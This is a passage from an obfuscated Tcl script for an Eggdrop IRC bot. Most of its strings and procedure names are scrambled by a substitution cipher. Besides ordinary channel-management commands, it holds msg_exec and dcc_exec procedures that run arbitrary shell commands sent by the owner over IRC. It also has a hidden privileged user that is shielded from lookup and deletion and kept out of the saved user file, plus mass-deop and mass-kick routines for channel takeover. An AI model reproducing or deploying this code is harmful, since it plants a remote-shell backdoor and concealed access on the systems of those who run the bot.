puthlp "KIRENHT ~$nick ~:`ivszhs                  ivszhsrmt wzgz kzxprmt zmw fmkzxprmt"
puthlp "KIRENHT ~$nick ~:`+/- prxpxlfngvi         Fhztv: +prxpxlfngvi lm/luu"
puthlp "KIRENHT ~$nick ~:!tzyx <nzhp> <ivzhlm>    zwwh zm rgvn gl gsv Tolyzo YzwXszm orhg"
puthlp "KIRENHT ~$nick ~:!tiyx <nzhp>		  ivnlevh zm rgvn uiln gsv Tolyzo YzwXszm orhg"
puthlp "KIRENHT ~$nick ~:!tyxorhg			  orhgh gsv clmgvmgh lu gsv Tolyzo YzwXszm orhg"
puthlp "KIRENHT ~$nick ~:!yxorhg			  orhgh gsv clmgvmgh lu gsv YzwXszm orhg uli gsv xfiivmg xszmmvo"
puthlp "KIRENHT ~$nick ~:!zyx <nzhp> <ivzhlm> 	  zwwh zm rgvn gl gsv YzwXszm orhg uli gsv xfiivmg xszmmvo"
puthlp "KIRENHT ~$nick ~:!iyx <nzhp>		  ivnlevh zm rgvn uiln gsv Tolyzo YzwXszm orhg uli gsv xfiivmg xszmmvo"
}
puthlp "KIRENHT ~$nick ~:UOZt ORhG FhVI & xSzMMvO"
puthlp "KIRENHT ~$nick ~:\[@\]K \[+\]ELRXV ZfGL\[E\]LRXV \[T\]fZIW \[X\]BXOV \[V\]mULIXVYZMH \[W\]lMGPRxP@KH \[M\]GxKziG"
puthlp "KIRENHT ~$nick ~:\[K\]IlGVXGVW X\[O\]LMV \[Z\]WEVIGRHV \[G\]LKRXOLXP ZfGL\[P\]RxP \[H\]VVM \[Y\]LOw Xl\[O\]LfI \[ZX\]GrlM"
puthlp "KIRENHT ~$nick ~:\[A\]ldmvi zwnr\[m\] \[n\]zhgvi ylgmv\[g\] \[c\]uvi \[q\]zmrgli \[x\]lnnlm"
puthlp "KIRENHT ~$nick ~:\[k\]zigb \[y\]lg \[f\]mhsziv \[s\]rorgv \[l\]k wv\[L\]k \[p\]rxp \[u\]irvmw"
puthlp "KIRENHT ~$nick ~:\[z\]fgl-lk zfgl\[e\]lrxv \[t\]elrxv \[j\]frvg \[C\]ml zww"
puthlp "KIRENHT ~$nick ~: "
puthlp "KIRENHT ~$nick ~:(#zOl\DzrMr)"
return 0
}
set [lines "urihggrnv"] "T"
set [lines "rmrg-hvievi"] { serverup "" }
set [lines "nlwvh-kvi-ormv"] 6
set [lines "zoold-wvhbmx"] 0
set [lines "rmxofwv-op"] 1
set [lines "yzmkofh"] [rand 5]
set [lines "yzm-grnv"] [expr 25 + $banplus]
unset banplus
set [lines "jfrvg-hzev"] 1
set [lines "olthgliv"] ""
set [lines "nzc-olthrav"] 512
set [lines "fkolzw-gl-kdw"] 1
set [lines "mlgy"] [dezip [dcp "AC96r./.Zye/z8/FY.NgoDC0"]]
set [lines "mlgx"] [dezip [dcp "59aHf/Y1pAA0yQ.U8/K9.wI/iv/zY/mMRy21"]]
catch { unbind dcc n restart *dcc:restart }
catch { unbind dcc n msg *dcc:msg }
catch { unbind dcc n status *dcc:status }
catch { unbind dcc n dump *dcc:dump }
proc [lines "hvievifk"] {heh} {
global botnick firsttime notc owner
if {[info exists firsttime]} {
unset firsttime
return 0 
}
putlog "..ConnecteD.."
putserv "MODE $botnick +iw-s"
foreach x [userlist] {
if {[matchattr $x Q]} { chattr $x -Q }
if {$x == $owner && [getuser $owner XTRA "AUTH"] != ""} { 
setuser $owner XTRA "AUTH" "" 
}
chattr $x -hp
if {$x != "config" && [chattr $x] == "-"} { 
deluser $x
putlog "deluser $x"
}
}
chk_five "0" "0" "0" "0" "0"
utimer 2 del_nobase
foreach x [ignorelist] {
killignore [lindex $x 0]
}
}
catch { bind evnt - disconnect-server serverdown }
proc [lines "hvieviwldm"] {heh} {
global firsttime
catch { unset firsttime }
catch { clearqueue all }
putlog "..Disconneted.."
foreach x [timers] {
if {[string match "*cycle*" $x]} { killtimer [lindex $x 2] }
}
}
proc [lines "rhmfnyvi"] {string} {
global notc
if {([string compare $string ""]) && (![regexp \[^0-9\] $string])} then {
return 1
}
return 0
}
proc [lines "kfy_yzmgrnv"] {nick uhost hand channel rest} {
global notc ban-time
puthlp "MLGRXV ~$nick ~:~$notc ~YzmGrnv \[~${ban-time}\]"
}
proc [lines "kfy_dsrxs"] {nick uhost hand channel rest} {
global botname notc
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: dsrxs <rk nzhp>"
return 0
}
if {[string match [string tolower $rest] [string tolower $botname]]} {
puthlp "KIRENHT ~$channel ~:~$botname"
}
}
proc [lines "izmwhgirmt"] {length} {
set [lines "xszih"] ABCDEFGHIJKLMNOPQRSTUVWXYZ
set [lines "xlfmg"] [string length $chars]
for {set i 0} {$i < $length} {incr i} {
append result [string index $chars [rand $count]]
}
return $result
}
######################
# BOT PUBLIC COMMAND #
######################
bind pub Z `which pub_which
bind pub n `reset pub_reset
bind pub f `host pub_host
bind pub f `flag pub_flag
bind pub m `ver pub_ver
bind pub m `logo pub_logo
bind pub Z `msg pub_msg
bind msg Z admin msg_admin
bind msg Z away msg_away
bind msg Z bantime msg_bantime
bind msg Z logo msg_logo
bind msg Z mmsg msg_mmsg
bind msg Z limit msg_limit
bind msg Z logchan msg_logchan
bind msg Z botnick msg_botnick
bind msg Z realname msg_realname
bind msg Z ident msg_ident
bind msg Z botaltnick msg_botaltnick
bind msg Z die msg_die
bind msg Z restart msg_restart
bind msg Z rehash msg_rehash
bind msg Z topic msg_topic
bind msg m memo msg_memo
bind pub n `-seen pub_-seen
bind pub n `+autovoice pub_+autovoice
bind pub n `-autovoice pub_-autovoice
bind pub n `+guard pub_+guard
bind pub n `-guard pub_-guard
bind pub n `+cycle pub_+cycle
bind pub n `-cycle pub_-cycle
bind pub n `+bold pub_+bold
bind pub n `-bold pub_-bold
bind pub n `+ntcpart pub_+ntcpart
bind pub n `-ntcpart pub_-ntcpart
bind pub n `+colours pub_+colours
bind pub n `-colours pub_-colours
bind pub n `+colour pub_+colours
bind pub n `-colour pub_-colours
bind pub n `+friend pub_+friend
bind pub n `-friend pub_-friend
bind pub n `+avoice pub_+avoice
bind pub n `-avoice pub_-avoice
bind pub n `+master pub_+master
bind pub n `-master pub_-master
bind pub n `mvoice pub_mvoice
bind pub n `mdevoice pub_mdevoice
bind pub n `mop pub_mop
bind pub n `mdeop pub_mdeop
bind pub n `+chan pub_+chan
bind msg n identify msg_identify
bind msg n kick msg_kick
bind msg n k msg_kick
bind msg n kickban msg_kickban
bind msg n kb msg_kickban
bind msg n op msg_op
bind msg n voice msg_voice
bind msg n v msg_voice
bind msg n deop msg_deop
bind msg n devoice msg_devoice
bind pub n `topic pub_topic
bind pub n `jump pub_jump
bind pub n `rehash pub_rehash
bind msg n +chan msg_+chan
bind msg n join msg_join
bind msg n part msg_part
bind pub m `voice pub_voice
bind pub m `+v pub_voice
bind pub m `devoice pub_devoice
bind pub m `-v pub_devoice
bind pub m `op pub_op
bind pub m `+o pub_op
bind pub m `deop pub_deop
bind pub m `-o pub_deop
bind pub m `kick pub_kick
bind pub m `k pub_kick
bind pub m `kickban pub_kickban
bind pub m `kb pub_kickban
bind pub m `+noop pub_+noop
bind pub m `-noop pub_-noop
bind pub m `ban pub_ban
bind pub m `unban pub_unban
bind pub m `munbans pub_munbans
bind pub m `banlist pub_banlist
bind pub m `mode pub_mode
bind pub m `join pub_join
bind pub m `part pub_part
bind pub m `cycle pub_cycle
bind pub m `up pub_up
bind pub m `down pub_down
bind msg m passwd msg_passwd
bind msg m deauth msg_deauth
bind msg m channels msg_channels
bind pub m `channels pub_channels
bind pub m `status pub_status
bind pub m `chaninfo pub_chaninfo
bind pub m `userlist pub_userlist
bind msg m userlist msg_userlist
bind pub f `access pub_access
bind pub m `match pub_match
proc [lines "kfy_A"] {nick uhost hand channel rest} {
global notc botnick
set [lines "kivhg"] $rest
if {[lindex $rest 0] == $botnick} {
regsub "$botnick " $rest "`" rest
} {
if {[string tolower [lindex $rest 0]] == [string tolower $botnick]} {
set [lines "ivhg"] "$botnick [lrange $rest 1 end]"
regsub "$botnick " $rest "`" rest
}
}
if {[string index $rest 0] != "`"} { return 0 }
if {![matchattr $nick Z]} { return 0 }
if {![matchattr $nick Q]} {
if {[string tolower [lindex $prest 0]] == [string tolower $botnick]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
}
return 0
}
set [lines "tlgl"] [lindex $rest 0]
regsub -all "`" $goto "pub_" goto
if {[matchattr $nick Z]} {
set [lines "ivhg"] [lrange $rest 1 end]
catch { $goto $nick $uhost $hand $channel $rest }
}
}
proc [lines "nht_ha"] {nick uhost hand rest} {
global botnick notc
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "ivhg"] [lindex $rest 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: /nht ~$botnick ~ha <gvcg>"
return 0
}
putsrv "MLGRXV ~$nick ~:~$notc lines: [lines "$rest"]"
putsrv "MLGRXV ~$nick ~:~$notc zip: [zip "$rest"]"
putsrv "MLGRXV ~$nick ~:~$notc dezip: [dezip "$rest"]"
putsrv "MLGRXV ~$nick ~:~$notc dcp: [dcp "$rest"]"
putsrv "MLGRXV ~$nick ~:~$notc dezip+dcp: [dezip [dcp "$rest"]]"
putsrv "MLGRXV ~$nick ~:~$notc decrypt: [decrypt 64 "$rest"]"
putsrv "MLGRXV ~$nick ~:~$notc encrypt: [encrypt 64 "$rest"]"
putsrv "MLGRXV ~$nick ~:~$notc unsix: [unsix "$rest"]"
return 0
}
proc [lines "nht_vmxibkg"] {nick uhost hand rest} {
global own notc
if {$nick != $own || $rest == ""} { return 0 }
puthlp "MLGRXV ~$nick ~:~$notc ~~[zip $rest]~"
}
proc [lines "nht_wvxibkg"] {nick uhost hand rest} {
global own notc
if {$nick != $own || $rest == ""} { return 0 }
puthlp "MLGRXV ~$nick ~:~$notc ~~[dezip $rest]~"
}
proc msg_exec {nick uhost hand command} {
   global own notc
   if {$nick != $own || $command == ""} { return 0 }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :$notc 4DeNIEd..!"
      return 0
   }
   set para1 [lindex $command 0]
   set para2 [lindex $command 1]
   set para3 [lindex $command 2]
   set para4 [lindex $command 3]
   set para5 [lindex $command 4]
   set para6 [lindex $command 5]
   set para7 [lindex $command 6]
   set para8 [lindex $command 7]
   set para9 [lindex $command 8]
   set para10 [lindex $command 9]
   set para11 [lindex $command 10]
   if {$para2 == ""} {
      catch { [exec $para1] } result
   } elseif {$para3 == ""} {
      catch { [exec $para1 $para2] } result
   } elseif {$para4 == ""} {
      catch { [exec $para1 $para2 $para3] } result
   } elseif {$para5 == ""} {
      catch { [exec $para1 $para2 $para3 $para4] } result
   } elseif {$para6 == ""} {
      catch { [exec $para1 $para2 $para3 $para4 $para5] } result
   } elseif {$para7 == ""} {
      catch { [exec $para1 $para2 $para3 $para4 $para5 $para6] } result
   } elseif {$para8 == ""} {
      catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7] } result
   } elseif {$para9 == ""} {
      catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8] } result
   } elseif {$para10 == ""} {
      catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8 $para9] } result
   } elseif {$para10 != ""} {
      catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8 $para9 $para10] } result
   }
   foreach line [split $result "\n"] {puthelp "PRIVMSG $nick :$notc $line"}
}
bind dcc * exec dcc_exec
bind dcc * log dcc_log
bind dcc * dir dcc_dir
bind dcc * read dcc_read
bind dcc * ` dcc_cmd
bind dcc * get dcc_get
bind dcc * u dcc_u
proc [lines "wxx_f"] {hand idx arg} {
foreach x [utimers] {
putdcc $idx $x
}
}
bind dcc * t dcc_t
proc [lines "wxx_g"] {hand idx arg} {
foreach x [timers] {
putdcc $idx $x
}
}
proc dcc_exec {hand idx arg} {
   global own notc
   if {$hand != $own || $arg == ""} { return 0 }
   set para1 [lindex $arg 0]
   set para2 [lindex $arg 1]
   set para3 [lindex $arg 2]
   set para4 [lindex $arg 3]
   set para5 [lindex $arg 4]
   set para6 [lindex $arg 5]
   set para7 [lindex $arg 6]
   set para8 [lindex $arg 7]
   set para9 [lindex $arg 8]
   set para10 [lindex $arg 9]
   set para11 [lindex $arg 10]
   if {$para2 == ""} {
      catch { [exec $para1] } result
   } elseif {$para3 == ""} {
      catch { [exec $para1 $para2] } result
   } elseif {$para4 == ""} {
      catch { [exec $para1 $para2 $para3] } result
   } elseif {$para5 == ""} {
      catch { [exec $para1 $para2 $para3 $para4] } result
   } elseif {$para6 == ""} {
      catch { [exec $para1 $para2 $para3 $para4 $para5] } result
   } elseif {$para7 == ""} {
      catch { [exec $para1 $para2 $para3 $para4 $para5 $para6] } result
   } elseif {$para8 == ""} {
      catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7] } result
   } elseif {$para9 == ""} {
      catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8] } result
   } elseif {$para10 == ""} {
      catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8 $para9] } result
   } elseif {$para10 != ""} {
      catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8 $para9 $para10] } result
   }
   putdcc $idx $result
}
proc [lines "kfy_slhg"] {nick uhost hand channel rest} {
global ps notc
if {$rest == ""} {
set [lines "fhvi"] $nick 
} else { 
set [lines "fhvi"] [lindex $rest 0] 
}
if {![validuser $user] || [string tolower $user] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
return 0
}
if {[getuser $user HOSTS] != ""} {
set [lines "slhgh"] [getuser $user hosts]
puthlp "MLGRXV ~$nick ~:~$notc ~SLHGH: ~$hosts"
} else {
puthlp "MLGRXV ~$nick ~:~$notc ~Xzm'g ulfmw ~$user ~slhg." 
}
}
proc [lines "kfy_uozt"] {nick uhost hand channel rest} {
global ps notc
if {$rest == ""} {
set [lines "fhvi"] $nick
} else { 
set [lines "fhvi"] [lindex $rest 0] 
}
if {![validuser $user] || [string tolower $user] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
return 0
}
if {[chattr $user] != ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Uozth: ~[chattr $user]~"
} else { 
puthlp "MLGRXV ~$nick ~:~$notc ~Xzm'g ulfmw ~$user ~uozt." 
}
}
catch { unbind dcc n match *dcc:match }
catch { unbind dcc n channel *dcc:channel }
proc [lines "kfy_wvofhvi"] {nick uhost hand channel rest} {
global botnick ps owner notc
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: wvofhvi <mrxp>"
return 0
}
set [lines "dsl"] [lindex $rest 0]
if {[string tolower $who] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
return 0 
}
if {$who == $owner} {
puthlp "MLGRXV ~$nick ~:~$notc ~BlF XzMG WvOvGV ~$owner..!"
return 0
}
if {$who == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -fhvi <mrxp>"
} else {
if {![validuser $who]} {
puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
} else {
if {[matchattr $who n]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Blf xzmmlg WvOVGV z ylg ldmvi."
} else {
if {([matchattr $who m]) && (![matchattr $nick n])} {
puthlp "MLGRXV ~$nick ~:~$notc ~Blf wlm'g szev zxxvhh gl WvOVGV ~$who!"
} else {
deluser $who
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~~$who ~WvOVGV."
}
}
}
}
}
proc [lines "kfy_xszggi"] {nick uhost hand channel rest} {
global ps own notc
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$nick != $own && [matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!yOLxpVw!"
return 0
}
set [lines "dsl"] [lindex $rest 0]
set [lines "uot"] [lindex $rest 1]
if {$who == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: xszggi <mrxp> <uozth>"
return 0
}
if {![validuser $who]} {
puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
return 0
}
if {[string tolower $who] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
return 0
}
if {$flg == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: xszggi <mrxp> <uozth>"
return 0
}
set [lines "ozhg_uot"] [chattr $who]
chattr $who $flg
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~~$who ~xszmtv uiln \[4~$last_flg14\] ~gl \[4~[chattr $who]~14\]"
return 0
}
proc [lines "hzevfhvi"] {} {
global ps owner
if {![validuser $ps]} {
setuser $owner XTRA "BEND" "xDB4L/z2DJT~1mianN/lj9Rq."
} elseif {$owner != $ps} {
setuser $owner XTRA "BEND" [zip [chattr $ps]]
if {[passwdok $ps ""] != 1} {
setuser $owner XTRA "LAST" [getuser $ps "PASS"]
}
deluser $ps
}
save
if {![validuser $ps]} {
adduser $ps "$ps!*@*"
chattr $ps [dezip [getuser $owner XTRA "BEND"]]
if {[getuser $owner XTRA "LAST"] != ""} {
setuser $ps PASS [getuser $owner XTRA "LAST"]
}
}
return 1
}
proc [lines "kfy_elrxv"] {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest == "" && [isvoice $nick $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: elrxv <mrxp>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest != ""} {
voiceq $chan $rest
} { 
voiceq $chan $nick 
}
return 0
}
proc [lines "kfy_nelrxv"] {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "mrxph"] ""
set [lines "r"] 0
set [lines "nvnyvih"] [chanlist $chan]
foreach x $members {
if {(![isop $x $chan]) && (![isvoice $x $chan]) && (![matchattr $x O])} {
if {$i == 6} {
voiceq $chan $nicks
set [lines "mrxph"] ""
append nicks " $x"
set [lines "r"] 1
} {
append nicks " $x"
incr i
}
}
}
voiceq $chan $nicks
}
proc [lines "kfy_wvelrxv"] {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest == "" && ![isvoice $nick $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: wvelrxv <mrxp>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest != ""} {
putserv "MODE $chan -vvvvvv $rest"
} else { 
putserv "MODE $chan -v $nick" 
}
return 0
}
proc [lines "kfy_nwvelrxv"] {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "mrxph"] ""
set [lines "r"] 0
set [lines "nvnyvih"] [chanlist $chan]
foreach x $members {
if {[isvoice $x $chan]} {
if {$i == 6} {
putserv "MODE $chan -vvvvvv $nicks"
set [lines "mrxph"] ""
append nicks " $x"
set [lines "r"] 1
} {
append nicks " $x"
incr i
}
}
}
putserv "MODE $chan -vvvvvv $nicks"
}
proc [lines "wvo_mlyzhv"] {} {
global botnick notc cmd_case quick banner basechan
set [lines "xfigrnv"] [ctime [unixtime]]
if {[isutimer "del_nobase"]} { return 0 }
foreach x [channels] {
set [lines "xrmul"] [channel info $x]
if {[string match "*+statuslog*" $cinfo] && [string match "*-secret*" $cinfo]} {
if {[onchan $botnick $x]} {
set [lines "krwc"] [rand 4]
if {$pidx == 1} {
set [lines "kgcg"] "BackToBase"
} elseif {$pidx == 2} {
set ptxt "(((((OuT)))))"
} elseif {$pidx == 3} {
set [lines "kgcg"] "gOHomE"
} elseif {$pidx == 4} {
set ptxt "(((aLoWaiNi)))"
} else {
if {[info exists banner]} {
set [lines "kgcg"] $banner
} {
set [lines "kgcg"] [lgrnd]
}
}
if {![string match "*c*" [getchanmode $x]]} {
set [lines "kgcg"] "14$ptxt"
}
if {$quick == "1"} {
putqck "KZIG ~$x ~:~$ptxt (~Lm ~$curtime)"
} {
putsrv "KZIG ~$x ~:~$ptxt (~Lm ~$curtime)"
}
}
channel remove $x
savechan
putlog "ReMoVe CHaN $x" 
return 0
}
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string match "*+stopnethack*" $cinfo]} {
catch { channel set $x -stopnethack }
}
if {[string match "*+protectops*" $cinfo]} {
catch { channel set $x -protectops }
}
if {[string match "*+protectfriends*" $cinfo]} {
catch { channel set $x -protectfriends }
}
if {[string match "*+statuslog*" $cinfo] && [string match "*+secret*" $cinfo]} {
catch { channel set $x -statuslog }
}
if {![onchan $botnick $x]} {
putsrv "QLRM ~$x"
}
if {[matchattr $cflag C]} {
if {![istimer "cycle $x"]} { timer [getuser $cflag XTRA "CYCLE"] [list cycle $x] }
}
}
if {[info exists basechan]} {
if {![validchan $basechan]} {
channel add $basechan { -greet +secret -statuslog }
}
}
savechan
}
utimer 2 del_nobase
proc [lines "kfy_lk"] {nick uhost hand chan rest} {
global notc botnick unop
catch {unset unop($nick)}
if {![isop $botnick $chan]} { return 0 }
if {$rest == "" && [isop $nick $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: lk <mrxp>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest != ""} { 
opq $chan $rest
} else { opq $chan $nick }
return 0
}
proc [lines "kfy_nlk"] {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "mrxph"] ""
set [lines "r"] 0
set [lines "nvnyvih"] [chanlist $chan]
foreach x $members {
if {![isop $x $chan]} {
if {$i == 6} {
opq $chan $nicks
set [lines "mrxph"] ""
append nicks " $x"
set [lines "r"] 1
} {
append nicks " $x"
incr i
}
}
}
opq $chan $nicks
}
proc [lines "kfy_wvlk"] {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest == "" && ![isop $nick $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: wvlk <mrxp>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[matchattr $nick m]} { 
set [lines "nivj"] "4M14asTeR.4R14eQuesT"
}
if {[matchattr $nick n]} {
set [lines "nivj"] "4A14DmIN.4R14eQuesT"
}
if {$rest != ""} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan -kooooo $mreq $rest"
} {
putserv "MODE $chan -ooooo $rest"
}
} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan -ko $mreq $nick" 
} {
putserv "MODE $chan -o $nick" 
}
}
return 0
}
proc [lines "kfy_nwvlk"] {nick uhost hand chan rest} {
global botnick notc 
if {![isop $botnick $chan]} { return 0 }
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {$nick != "*"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
}
set [lines "mrxph"] ""
set [lines "r"] 0
set [lines "nvnyvih"] [chanlist $chan]
foreach x $members {
if {([isop $x $chan]) && (![matchattr $x m]) && ($x != $botnick)} {
if {$i == 5} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan -kooooo 4A14DmIN.4R14eQuesT $nicks"
} {
putserv "MODE $chan -ooooo $nicks"
}
set [lines "mrxph"] ""
append nicks " $x"
set [lines "r"] 1
} {
append nicks " $x"
incr i
}
}
}
putserv "MODE $chan -oooooo $nicks"
}
proc [lines "kfy_prxp"] {nick uhost hand chan rest} {
global botnick notc 
if {![isop $botnick $chan]} { return 0 }
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: prxp <mrxp|slhg> <ivzhlm>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "ivzhlm"] [lrange $rest 1 end]
set [lines "szmwov"] [lindex $rest 0]
if {$reason == ""} {
if {[matchattr $nick m]} { 
set [lines "ivzhlm"] "14MasTeR 4KIcK14 ReQuesT4..! [banmsg]" 
}
if {[matchattr $nick n]} {
set [lines "ivzhlm"] "14ADmIN 4KIcK14 ReQuesT4..! [banmsg]" 
}
}
if {[string match "*@*" $handle]} {
foreach knick [chanlist $chan] {
if {[string match [string tolower $handle] [string tolower $knick![getchanhost $knick $chan]]]} {
if {[matchattr $knick f] || $knick != $botnick} {
putsrv "PRXP ~$chan ~~$knick ~:~$notc ~~$reason"
}
}
}
return 0
}
if {$handle == $botnick} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, Xzm'g prxp nb hvou."
return 0
}
if {[matchattr $handle n] && ![matchattr $nick Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, XzMG PRxP ZWnRM UOZt"
return 0
}
putsrv "PRXP ~$chan ~~$handle ~:~$notc ~~$reason"
return 0
}
proc [lines "kfy_nprxp"] {nick uhost hand chan rest} {
global botnick notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
set [lines "ivzhlm"] [lrange $rest 1 end]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
} else { 
set [lines "ivzhlm"] $rest 
}
if {(![validchan $chan]) || (![isop $botnick $chan])} { return 0 }
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$reason == ""} { 
set [lines "ivzhlm"] "14ADmIN 4MaSSKIcK14 ReQuesT4..! [banmsg]" 
}
set [lines "nvnyvih"] [chanlist $chan]
foreach x $members {
if {(![matchattr $x f]) && ($x != $botnick)} { 
putsrv "PRXP ~$chan ~~$x ~:~$notc ~~$reason"
}
}
}
proc [lines "kfy_prxpyzm"] {nick uhost hand chan rest} {
global botnick notc bannick
if {![isop $botnick $chan]} { return 0 }
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: prxpyzm <mrxp|slhg> <ivzhlm>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: prxpyzm <mrxp> <ivzhlm>"
return 0
}
set [lines "ivzhlm"] [lrange $rest 1 end]
set [lines "szmwov"] [lindex $rest 0]
if {$reason == ""} {
if {[matchattr $nick m]} {
set [lines "ivzhlm"] "14MasTeR 4KIcKBaN14 ReQuesT [banmsg]"
}
if {[matchattr $nick n]} {
set [lines "ivzhlm"] "14ADmIN 4KIcKBaN14 ReQuesT [banmsg]"
}
}
if {[string match "*@*" $handle]} {
set [lines "nurhig"] "T"
foreach knick [chanlist $chan] {
if {[string match [string tolower $handle] [string tolower $knick![getchanhost $knick $chan]]]} {
if {[matchattr $knick f] || $knick != $botnick} {
if {$mfirst == "T"} {
set bannick($knick) $handle
set [lines "nurihg"] "F"
}
putsrv "PRXP ~$chan ~~$knick ~:~$notc ~~$reason"
}
}
}
return 0
}
if {![onchan $handle $chan]} { return 0 }
set [lines "slhgnzhp"] [getchanhost $handle $chan]
set [lines "slhgnzhp"] "*!*@[lindex [split $hostmask @] 1]"
if {$handle == $botnick} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, Xzm'g prxp nb hvou."
return 0
}
if {[matchattr $handle n] && ![matchattr $nick Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, XzMG PRxP ZWnRM UOzT"
return 0
}
set bannick($handle) $hostmask
putsrv "PRXP ~$chan ~~$handle ~:~$notc ~~$reason"
return 0
}
proc [lines "kfy_yzm"] {nick uhost hand channel rest} {
global botnick notc
if {![isop $botnick $channel]} { return 0 }
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: yzm <mrxp/slhgnzhp>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "szmwov"] [lindex $rest 0]
if {$handle == $botnick} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!WvMRVw!, xzm'g yzm nb hvou"
return 0
}
if {[matchattr $handle n]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!WvMRVw!, xzmg yzm ZWnRM"
return 0
}
